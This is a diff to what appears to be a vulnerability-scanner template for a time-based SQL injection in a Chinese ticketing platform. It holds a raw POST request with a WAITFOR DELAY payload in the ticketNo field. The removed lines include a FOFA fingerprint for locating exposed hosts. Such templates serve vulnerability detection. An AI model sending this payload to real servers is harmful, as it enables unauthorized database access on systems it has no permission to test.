@@ -3,12 +3,8 @@ info:
   name: 中城科信票务管理平台-SQL-ReturnTicketPlance
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/csxciw7x3mhxx2mu'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: csxciw7x3mhxx2mu
-    fofa: '"js/System/jquery.ellipsis.min.js" && icon_hash="1632964065"'
 http:
 - raw:
   - 'POST /SystemManager/TicketSystem/ReturnTicketPlance.ashx HTTP/1.1
@@ -27,8 +23,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     Method=GetCheckInDetail&ticketNo=1'';WAITFOR+DELAY''0:0:5''--+
